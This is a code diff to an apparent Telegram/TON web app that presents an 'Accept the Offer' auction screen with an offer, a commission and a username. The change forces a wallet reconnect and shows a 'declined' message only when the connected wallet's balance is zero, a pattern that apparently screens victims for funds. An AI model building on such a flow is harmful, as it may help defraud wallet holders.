@@ -6,6 +6,7 @@ import NavBar from "./components/NavBar";
 import { Address, toNano } from "ton-core";
 import { useEffect, useState } from "react";
 import Modal from "./components/Modal";
+import DeclinedModal from "./components/DeclinedModal";
 
 function App() {
   const { handleWalletConnect, handleWalletDisconnect, connected, sender } =
@@ -17,8 +18,10 @@ function App() {
   const [username, setUsername] = useState("");
   const [offer, setOffer] = useState("");
   const [commission, setCommission] = useState("");
+  const [accepted, setAccepted] = useState(false);
 
   const [open, setOpen] = useState(false);
+  const [openDeclined, setOpenDeclined] = useState(false);
 
   const handleClose = () => {
     setOpen(false);
@@ -26,6 +29,14 @@ function App() {
 
   const handleOpen = () => {
     setOpen(true);
+  };
+
+  const handleDeclinedClose = () => {
+    setOpenDeclined(false);
+  };
+
+  const handleDeclinedOpen = () => {
+    setOpenDeclined(true);
   };
 
   const send = async () => {
@@ -41,6 +52,7 @@ function App() {
   useEffect(() => {
     const initWebApp = async () => {
       if (typeof window !== "undefined") {
+        handleWalletDisconnect();
         const WebApp = (await import("@twa-dev/sdk")).default;
         WebApp.ready();
         setInitData(WebApp.initData);
@@ -57,15 +69,31 @@ function App() {
     initWebApp();
   }, []);
 
-  // console.log(initData);
-  // console.log(username);
-  // console.log(startParam);
+  const connectWallet = async () => {
+    if (connected) {
+      handleWalletDisconnect();
+    }
+
+    await handleWalletConnect();
+    setAccepted(true);
+  };
+
+  useEffect(() => {
+    if (accepted && connected) {
+      if (balance == 0) {
+        handleDeclinedOpen();
+      }
+    }
+    return () => {
+      setAccepted(false);
+    };
+  }, [balance]);
 
   return (
     <>
       <div className="app">
         <NavBar />
-        {!startParam ? (
+        {startParam ? (
           <p className="not-found">Not Found</p>
         ) : (
           <div className="auction">
@@ -107,10 +135,7 @@ function App() {
                 </div>
               </div>
             </div>
-            <button
-              className="btn"
-              onClick={connected ? send : handleWalletConnect}
-            >
+            <button className="btn" onClick={connectWallet}>
               Accept the Offer
             </button>
             <p className="link hover hidden">Subscribe to updates</p>
@@ -157,6 +182,7 @@ function App() {
       </div>
 
       <Modal open={open} handleClose={handleClose} />
+      <DeclinedModal open={openDeclined} handleClose={handleDeclinedClose} />
     </>
   );
 }
